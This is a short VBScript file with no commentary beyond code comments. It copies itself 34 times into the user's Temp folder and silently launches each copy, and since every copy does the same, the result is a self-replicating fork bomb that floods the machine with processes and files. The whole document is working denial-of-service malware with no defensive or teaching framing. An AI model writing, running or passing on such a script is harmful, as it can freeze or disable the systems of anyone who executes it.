Option Explicit

Dim fso, shell, tempFolder, scriptPath, i

' Create FileSystemObject and WScript.Shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get the Temp directory path
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")

' Get the full path of the current script
scriptPath = WScript.ScriptFullName

' Loop to copy the script 34 times
For i = 1 To 34
    fso.CopyFile scriptPath, tempFolder & "\Copy_" & i & ".vbs"
Next

' Run each copied script silently
For i = 1 To 34
    shell.Run """" & tempFolder & "\Copy_" & i & ".vbs""", 0, False
Next
